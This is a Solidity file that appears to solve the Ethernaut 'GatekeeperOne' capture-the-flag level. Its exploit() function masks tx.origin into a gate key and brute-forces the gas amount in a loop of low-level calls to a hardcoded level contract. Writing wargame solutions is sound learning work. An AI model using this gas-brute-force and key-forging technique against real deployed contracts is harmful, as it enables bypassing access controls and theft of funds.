// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel13.sol";

contract GateKeeper {
    GatekeeperOne level13 =
        GatekeeperOne(0x26Cd7071Ef1100732f5d37F53AE28877F0FE9624);

    function exploit() external {
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) &
            0xFFFFFFFF0000FFFF;

        for (uint i = 0; i < 300; i++) {
            (bool success, ) = address(level13).call{gas: i + (8191 * 3)}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
